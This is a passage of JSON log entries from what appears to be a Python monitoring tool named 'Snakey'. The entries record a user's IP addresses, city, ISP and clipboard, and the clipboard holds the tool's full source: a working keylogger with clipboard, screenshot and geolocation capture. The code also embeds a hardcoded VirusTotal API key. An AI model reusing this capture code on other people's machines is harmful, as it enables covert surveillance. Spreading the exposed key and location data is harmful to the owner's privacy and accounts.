os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(CONFIG[\"stop_file_path\"])\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(CONFIG[\"wazuh_log_path\"], \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef get_system_info():\r\n    system_info = {}\r\n    try:\r\n        system_info[\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        system_info[\"hostname\"] = hostname\r\n        system_info[\"private_ip\"] = socket.gethostbyname(hostname)\r\n        public_ip, country, city, isp = get_public_ip_and_geolocation()\r\n        system_info[\"public_ip\"] = public_ip\r\n        system_info[\"country\"] = country\r\n        system_info[\"city\"] = city\r\n        system_info[\"isp\"] = isp\r\n        system_info[\"processor\"] = platform.processor()\r\n        system_info[\"os\"] = platform.system() + \" \" + platform.version()\r\n        system_info[\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        print(f\"[ERROR] System info retrieval failed: {e}\")\r\n    return system_info\r\n\r\n\r\ndef get_clipboard_data():\r\n    clipboard_data = \"\"\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            clipboard_data = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            clipboard_data = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n    except Exception as e:\r\n        clipboard_data = f\"Clipboard error: {e}\"\r\n    return clipboard_data\r\n\r\n\r\ndef take_screenshot():\r\n    try:\r\n        im = ImageGrab.grab()\r\n        im.save(CONFIG[\"screenshot_path\"])\r\n        return True\r\n    except Exception as e:\r\n        print(f\"[ERROR] Screenshot error: {e}\")\r\n        return False\r\n\r\n\r\ndef run_keylogger(duration=10):\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < duration:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n    return ''.join(keys)\r\n\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": get_system_info(),\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    if session_log[\"system\"].get(\"country\") and session_log[\"system\"][\"country\"] not in CONFIG[\"known_countries\"]:\r\n        session_log[\"alerts\"].append(f\"Access from untrusted country: {session_log['system']['country']}\")\r\n\r\n    clipboard_data = get_clipboard_data()\r\n    session_log[\"clipboard\"] = clipboard_data\r\n    session_log[\"clipboard_hash\"] = hash_text(clipboard_data)\r\n\r\n    if take_screenshot():\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(CONFIG[\"screenshot_path\"])\r\n\r\n    if clipboard_data.startswith(\"http\"):\r\n        vt_result = vt_lookup_url(clipboard_data)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(CONFIG[\"screenshot_path\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    session_log[\"keystrokes\"] = run_keylogger()\r\n    session_log[\"keystrokes_hash\"] = hash_text(session_log[\"keystrokes\"])\r\n\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    return session_log\r\n\r\n\r\ndef save_and_encrypt_log(session_log):\r\n    try:\r\n        # Load existing logs if present\r\n        logs = []\r\n        if os.path.exists(CONFIG[\"json_log_path\"]):\r\n            with open(CONFIG[\"json_log_path\"], \"r\") as log_file:\r\n                logs = json.load(log_file)\r\n\r\n        logs.append(session_log)\r\n\r\n        with open(CONFIG[\"json_log_path\"], \"w\") as log_file:\r\n            json.dump(logs, log_file, indent=4)\r\n\r\n        # Encrypt the log\r\n        with open(CONFIG[\"json_log_path\"], \"rb\") as f:\r\n            data = f.read()\r\n        encrypted_data = fernet.encrypt(data)\r\n        encrypted_file_path = CONFIG[\"json_log_path\"] + \".enc\"\r\n        with open(encrypted_file_path, \"wb\") as enc_file:\r\n            enc_file.write(encrypted_data)\r\n\r\n        print(f\"[INFO] Log saved and encrypted at {encrypted_file_path}\")\r\n\r\n        # Hash the log and save to ledger\r\n        log_hash = hash_file(CONFIG[\"json_log_path\"])\r\n        ledger = []\r\n        if os.path.exists(CONFIG[\"hash_ledger_path\"]):\r\n            with open(CONFIG[\"hash_ledger_path\"], \"r\") as f:\r\n                ledger = json.load(f)\r\n        ledger.append(log_hash)\r\n        with open(CONFIG[\"hash_ledger_path\"], \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        # Build Merkle Root\r\n        merkle_root = build_merkle_tree(ledger.copy())\r\n        if merkle_root:\r\n            with open(CONFIG[\"merkle_root_path\"], \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n        print(f\"[INFO] Merkle root: {merkle_root}\")\r\n\r\n    except Exception as e:\r\n        print(f\"[ERROR] Saving and encryption failed: {e}\")\r\n\r\n\r\n# === Entry Point ===\r\nif __name__ == \"__main__\":\r\n    try:\r\n        log_data = collect_full_session()\r\n        save_and_encrypt_log(log_data)\r\n        log_to_wazuh_file(log_data)\r\n    except Exception as e:\r\n        print(f\"[FATAL ERROR] {e}\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6d5f21f0428bcb2f80a0323a0122afa5d194c5cc6c46d75c9729ce717223ebdd", "screenshot_hash": "1eb04ad5a62aa1080a1595d2a11d8a02976eaa83facbf64aeb004d3caf64f563", "keystrokes_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-21T11:57:32.452649", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2001:8a0:df46:3c00:c99:cdb4:5c2e:cb7f", "country": "Portugal", "city": "Covilha", "isp": "MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "def save_and_encrypt_log(session_log):\r\n    try:\r\n        # Load existing logs if present\r\n        logs = []\r\n        if os.path.exists(CONFIG[\"json_log_path\"]):\r\n            with open(CONFIG[\"json_log_path\"], \"r\") as log_file:\r\n                logs = json.load(log_file)\r\n\r\n        logs.append(session_log)\r\n\r\n        with open(CONFIG[\"json_log_path\"], \"w\") as log_file:\r\n            json.dump(logs, log_file, indent=4)\r\n\r\n        # Encrypt the log\r\n        with open(CONFIG[\"json_log_path\"], \"rb\") as f:\r\n            data = f.read()\r\n        encrypted_data = fernet.encrypt(data)\r\n        encrypted_file_path = CONFIG[\"json_log_path\"] + \".enc\"\r\n        with open(encrypted_file_path, \"wb\") as enc_file:\r\n            enc_file.write(encrypted_data)\r\n\r\n        print(f\"[INFO] Log saved and encrypted at {encrypted_file_path}\")\r\n\r\n        # Hash the log and save to ledger\r\n        log_hash = hash_file(CONFIG[\"json_log_path\"])\r\n\r\n        ledger = []\r\n        if os.path.exists(CONFIG[\"hash_ledger_path\"]):\r\n            with open(CONFIG[\"hash_ledger_path\"], \"r\") as f:\r\n                ledger = json.load(f)\r\n\r\n        # Make sure all ledger items are strings (hashes)\r\n        ledger = [str(h) if not isinstance(h, str) else h for h in ledger]\r\n\r\n        ledger.append(log_hash)\r\n\r\n        with open(CONFIG[\"hash_ledger_path\"], \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"Ledger contents types before Merkle build:\", [type(h) for h in ledger])\r\n        print(\"Ledger contents before Merkle build:\", ledger)\r\n\r\n        # Build Merkle Root\r\n        merkle_root = build_merkle_tree(ledger.copy())\r\n        if merkle_root:\r\n            with open(CONFIG[\"merkle_root_path\"], \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n        print(f\"[INFO] Merkle root: {merkle_root}\")\r\n\r\n    except Exception as e:\r\n        print(f\"[ERROR] Saving and encryption failed: {e}\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4f764cdd69695d35be2938ba091dabe1af0b8c6ecf14fe24a2d1372cd455ab00", "screenshot_hash": "b059cdf7f31a3113b44defff418704a5b0780c4cbdf5b4a8045861c39b1e5ae6", "keystrokes_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-21T11:59:30.693321", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        # === Public IP and ISP lookup ===\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "d94d8486cb092eda961b98f19aa1a940564ed1ba7c185050f6a9a2ac233cbdef", "screenshot_hash": "fdf9b4015db6b819ec726b56822da9e6eae35ab7a71759e653ba95d1034bbd02", "log_hash": "2fea8d6b68fccdcc21cdb0900b94629cc1b2de416b4edf6b6d7f1c4f99547b90"}
{"timestamp": "2025-05-21T11:59:56.659400", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        # === Public IP and ISP lookup ===\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    